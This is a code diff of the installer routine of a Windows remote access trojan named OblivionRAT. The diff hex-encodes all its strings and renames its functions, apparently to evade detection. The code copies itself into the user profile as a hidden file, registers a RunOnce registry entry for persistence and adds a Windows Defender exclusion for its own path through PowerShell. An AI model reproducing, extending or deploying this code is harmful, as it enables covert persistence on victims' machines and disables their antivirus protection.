@@ -4,85 +4,85 @@ void Start(void)
 {
     wchar_t buffer[MAX_PATH];
 
-    // Obtenir le chemin du fichier exécutable actuel
+    // Get the path of the executable file
     if (GetModuleFileName(NULL, buffer, MAX_PATH) == 0) {
-        std::wcerr << L"Erreur lors de l'obtention du chemin du fichier exécutable : " << GetLastError() << std::endl;
+        std::wcerr << L"\x45\x72\x72\x6f\x72\x20\x6f\x62\x74\x61\x69\x6e\x69\x6e\x67\x20\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x20\x66\x69\x6c\x65\x20\x70\x61\x74\x68\x20\x3a\x20" << GetLastError() << std::endl;
     }
 
-    // Définir le chemin de destination en utilisant %userprofile%
+    // Define the destination path
     wchar_t dest[MAX_PATH];
-    ExpandEnvironmentStrings(L"%userprofile%\\OblivionRAT.exe", dest, MAX_PATH);
+    ExpandEnvironmentStrings(L"\x25\x75\x73\x65\x72\x70\x72\x6f\x66\x69\x6c\x65\x25\x5c\x4f\x62\x6c\x69\x76\x69\x6f\x6e\x52\x41\x54\x2e\x65\x78\x65", dest, MAX_PATH);
 
-    // Vérifier si le fichier existe déjà
+    // Verify if the file already exists
     if (PathFileExists(dest)) {
-        std::wcout << L"File already exists" << std::endl;
+        std::wcout << L"\x46\x69\x6c\x65\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65\x78\x69\x73\x74\x73" << std::endl;
     }
     else {
-        // Copier le fichier exécutable vers le répertoire de destination
+        // Copy the file to the destination
         if (!CopyFile(buffer, dest, FALSE)) {
-            std::wcerr << L"Erreur lors de la copie du fichier : " << GetLastError() << std::endl;
+            std::wcerr << L"\x45\x72\x72\x6f\x72\x20\x63\x6f\x70\x79\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x3a\x20" << GetLastError() << std::endl;
         }
-        // Définir l'attribut caché sur le fichier
+        // Define the file as hidden
         if (!SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN)) {
-            std::wcerr << L"Erreur lors de la définition de l'attribut caché : " << GetLastError() << std::endl;
+            std::wcerr << L"\x45\x72\x72\x6f\x72\x20\x77\x68\x65\x6e\x20\x64\x65\x66\x69\x6e\x69\x6e\x67\x20\x74\x68\x65\x20\x68\x69\x64\x64\x65\x6e\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x20\x3a\x20" << GetLastError() << std::endl;
         }
-        std::wcout << L"File copied and attribute set successfully" << std::endl;
+        std::wcout << L"\x46\x69\x6c\x65\x20\x63\x6f\x70\x69\x65\x64\x20\x61\x6e\x64\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x20\x73\x65\x74\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79" << std::endl;
     }
 
-    // Appel des deux fonctions distinctes pour générer la clé de registre aléatoire et la définir
-    std::wstring randomRegistryKey = GenerateRandomRegistryKey(10);
+    // Generate a random registry key
+    std::wstring random = GenerateRandom(10);
     std::wstring wideDest = dest;
-    SetStartupRegistryKey(randomRegistryKey, wideDest);
-    SetExclusionRegistryKey(dest);
+    SetStartKey(random, wideDest);
+    SetExclusionKey(dest);
 }
 
-std::wstring GenerateRandomRegistryKey(int length) {
+std::wstring GenerateRandom(int length) {
     std::wstring alphabet = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    std::wstring randomKey;
+    std::wstring Key;
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> dis(0, alphabet.size() - 1);
 
     for (int i = 0; i < length; ++i) {
-        randomKey.push_back(alphabet[dis(gen)]);
+        Key.push_back(alphabet[dis(gen)]);
     }
 
-    return randomKey;
+    return Key;
 }
 
-void SetStartupRegistryKey(const std::wstring& registryKey, const std::wstring& value) {
-    // Convertir la clé et la valeur en chaînes de caractères std::string
-    std::wstring wstrRegistryKey = registryKey;
+void SetStartKey(const std::wstring& Key, const std::wstring& value) {
+    // Convert the registry key and value to std::string for the PowerShell command
+    std::wstring wstrKey = Key;
     std::wstring wstrValue = value;
-    std::string strRegistryKey(wstrRegistryKey.begin(), wstrRegistryKey.end());
+    std::string strKey(wstrKey.begin(), wstrKey.end());
     std::string strValue(wstrValue.begin(), wstrValue.end());
 
-    // Construire la commande PowerShell pour ajouter l'entrée au registre
-    std::string powershellCmd = "powershell -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name '" + strRegistryKey + "' -Value '" + strValue + "' -PropertyType String -Force\"";
+    // Define the PowerShell command
+    std::string cmd = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x20\x2d\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x22\x4e\x65\x77\x2d\x49\x74\x65\x6d\x50\x72\x6f\x70\x65\x72\x74\x79\x20\x2d\x50\x61\x74\x68\x20\x27\x48\x4b\x4c\x4d\x3a\x5c\x53\x4f\x46\x54\x57\x41\x52\x45\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x43\x75\x72\x72\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x5c\x52\x75\x6e\x4f\x6e\x63\x65\x27\x20\x2d\x4e\x61\x6d\x65\x20\x27" + strKey + "\x27\x20\x2d\x56\x61\x6c\x75\x65\x20\x27" + strValue + "\x27\x20\x2d\x50\x72\x6f\x70\x65\x72\x74\x79\x54\x79\x70\x65\x20\x53\x74\x72\x69\x6e\x67\x20\x2d\x46\x6f\x72\x63\x65\x22";
 
-    // Exécuter la commande PowerShell
-    int result = system(powershellCmd.c_str());
+    // Execute the command
+    int result = system(cmd.c_str());
 
-    // Vérifier le résultat de l'exécution
+    // Verify if the command was executed successfully
     if (result == 0) {
-        std::wcout << L"Startup configured successfully" << std::endl;
+        std::wcout << L"\x53\x74\x61\x72\x74\x75\x70\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79" << std::endl;
     }
     else {
-        std::wcerr << L"Error configuring startup: " << result << std::endl;
+        std::wcerr << L"\x45\x72\x72\x6f\x72\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x69\x6e\x67\x20\x73\x74\x61\x72\x74\x75\x70\x3a\x20" << result << std::endl;
     }
 }
 
-void SetExclusionRegistryKey(const wchar_t* value) {
-    // Convertir le chemin d'exclusion en std::string pour la commande PowerShell
+void SetExclusionKey(const wchar_t* value) {
+    // Convert the value to std::string for the PowerShell command
     std::wstring wstr(value);
     std::string str(wstr.begin(), wstr.end());
 
-    // Commande PowerShell pour ajouter l'exclusion
-    std::string addCmd = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"" + str + "\"";
+    // Define the PowerShell command
+    std::string addCmd = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x20\x2d\x69\x6e\x70\x75\x74\x66\x6f\x72\x6d\x61\x74\x20\x6e\x6f\x6e\x65\x20\x2d\x6f\x75\x74\x70\x75\x74\x66\x6f\x72\x6d\x61\x74\x20\x6e\x6f\x6e\x65\x20\x2d\x4e\x6f\x6e\x49\x6e\x74\x65\x72\x61\x63\x74\x69\x76\x65\x20\x2d\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x41\x64\x64\x2d\x4d\x70\x50\x72\x65\x66\x65\x72\x65\x6e\x63\x65\x20\x2d\x45\x78\x63\x6c\x75\x73\x69\x6f\x6e\x50\x61\x74\x68\x20\x22" + str + "\x22";
     if (system(addCmd.c_str()) == 0) {
-        std::cout << "Exclusion added successfully" << std::endl;
+        std::cout << "\x45\x78\x63\x6c\x75\x73\x69\x6f\x6e\x20\x61\x64\x64\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79" << std::endl;
     }
     else {
-        std::cerr << "Error adding exclusion" << std::endl;
+        std::cerr << "\x45\x72\x72\x6f\x72\x20\x61\x64\x64\x69\x6e\x67\x20\x65\x78\x63\x6c\x75\x73\x69\x6f\x6e" << std::endl;
     }
 }
